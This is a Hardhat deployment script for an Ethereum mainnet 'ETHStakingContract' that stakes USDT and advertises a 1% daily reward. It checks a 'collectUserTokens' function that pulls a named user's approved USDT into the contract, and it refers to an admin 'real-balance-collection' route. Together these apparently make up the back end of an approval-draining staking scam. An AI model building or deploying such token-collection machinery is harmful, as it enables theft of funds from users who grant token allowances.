const { ethers } = require("hardhat");
const fs = require('fs');
const path = require('path');

async function main() {
  console.log("🚀 使用 Hardhat 部署修复后的 ETHStakingContract...");

  const [deployer] = await ethers.getSigners();
  console.log("📝 部署账户:", deployer.address);

  const balance = await ethers.provider.getBalance(deployer.address);
  console.log("💰 账户余额:", ethers.formatEther(balance), "ETH");

  // 检查网络
  const network = await ethers.provider.getNetwork();
  console.log("🌐 网络:", network.name, "ChainId:", network.chainId);

  // 部署参数
  const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
  const REWARD_RATE = 100; // 1% 日奖励率
  const MIN_STAKE = ethers.parseUnits('1', 6); // 1 USDT
  const MAX_STAKE = ethers.parseUnits('1000000', 6); // 1,000,000 USDT

  console.log("\n📋 部署参数:");
  console.log("  USDT地址:", USDT_ADDRESS);
  console.log("  奖励率:", REWARD_RATE, "基点 (1%)");
  console.log("  最小质押:", ethers.formatUnits(MIN_STAKE, 6), "USDT");
  console.log("  最大质押:", ethers.formatUnits(MAX_STAKE, 6), "USDT");

  // 编译和部署合约
  console.log("\n📦 编译和部署 ETHStakingContract...");
  const ETHStakingContract = await ethers.getContractFactory("ETHStakingContract");
  
  // 部署合约
  console.log("🚀 开始部署...");
  const stakingContract = await ETHStakingContract.deploy(
    USDT_ADDRESS,
    REWARD_RATE,
    MIN_STAKE,
    MAX_STAKE
  );

  console.log("⏳ 等待部署确认...");
  await stakingContract.waitForDeployment();

  const contractAddress = await stakingContract.getAddress();
  console.log("✅ ETHStakingContract 部署成功!");
  console.log("📍 新合约地址:", contractAddress);
  console.log("🔗 Etherscan:", `https://etherscan.io/address/${contractAddress}`);

  // 验证部署
  console.log("\n🔍 验证合约部署...");
  const code = await ethers.provider.getCode(contractAddress);
  if (code === "0x") {
    throw new Error("❌ 合约部署失败：代码为空");
  }
  console.log("✅ 合约代码验证成功");

  // 验证合约参数
  console.log("\n🔍 验证合约参数...");
  const owner = await stakingContract.owner();
  const stakingToken = await stakingContract.stakingToken();
  const rewardRate = await stakingContract.rewardRate();
  const minStakeAmount = await stakingContract.minStakeAmount();
  const maxStakeAmount = await stakingContract.maxStakeAmount();

  console.log("👑 合约所有者:", owner);
  console.log("💰 质押代币:", stakingToken);
  console.log("📊 奖励率:", rewardRate.toString(), "基点");
  console.log("📉 最小质押:", ethers.formatUnits(minStakeAmount, 6), "USDT");
  console.log("📈 最大质押:", ethers.formatUnits(maxStakeAmount, 6), "USDT");
  
  // 验证修复
  console.log("\n🔧 验证 collectUserTokens 修复...");
  try {
    const testUser = '0x4878A54cdfC6b4fB2136C4726b9753F6dD056B13';
    const testAmount = ethers.parseUnits('1', 6);
    
    await stakingContract.collectUserTokens.staticCall(testUser, testAmount);
    console.log("⚠️ 意外：测试调用应该失败");
  } catch (error) {
    if (error.message.includes('Insufficient allowance') || 
        error.message.includes('Insufficient balance') ||
        error.message.includes('Transfer to contract failed')) {
      console.log("✅ collectUserTokens 函数逻辑正确");
    } else {
      console.log("❌ collectUserTokens 函数异常:", error.message.slice(0, 100));
    }
  }

  // 保存部署信息
  const deploymentInfo = {
    network: "ethereum",
    contractName: "ETHStakingContract", 
    contractAddress: contractAddress,
    deployer: deployer.address,
    usdtAddress: USDT_ADDRESS,
    rewardRate: REWARD_RATE,
    minStake: MIN_STAKE.toString(),
    maxStake: MAX_STAKE.toString(),
    deploymentTime: new Date().toISOString(),
    etherscanUrl: `https://etherscan.io/address/${contractAddress}`,
    transactionHash: stakingContract.deploymentTransaction()?.hash
  };

  // 更新部署配置文件
  fs.writeFileSync('deployment-eth-staking.json', JSON.stringify(deploymentInfo, null, 2));
  console.log("\n📄 部署信息已保存到 deployment-eth-staking.json");

  console.log("\n🎉 部署完成！");
  console.log("📝 请更新配置文件中的合约地址:");
  console.log(`   新合约地址: ${contractAddress}`);
  console.log(`   旧合约地址: 0xb4c181CcBd4DEb3C99D5030a703194E74f2482a6`);
  
  console.log("\n🔧 需要更新的文件:");
  console.log("1. src/lib/contracts.ts");
  console.log("2. src/config/admin.ts");
  console.log("3. src/app/api/admin/real-balance-collection/route.ts");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("❌ 部署失败:", error);
    process.exit(1);
  });



